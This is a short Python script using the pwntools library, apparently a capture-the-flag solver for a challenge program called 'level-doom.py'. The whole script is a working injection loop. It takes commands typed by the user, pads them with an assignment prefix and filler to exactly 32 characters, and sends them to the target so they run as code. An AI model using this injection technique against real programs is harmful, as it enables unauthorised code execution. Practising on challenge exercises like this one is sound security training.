from pwn import *
import time
io = process(['python3','level-doom.py'])
while True:
	leng = 32
	cmd = input("$> ")
	start = "a="
	end = ";"
	ris = leng-len(cmd)-len(start)-len(end)-1
	gen = "'"+"A"*ris+"'"
	payload = start + gen + end + cmd
	info(payload)
	io.sendline(payload)
	print(io.recv(1024))
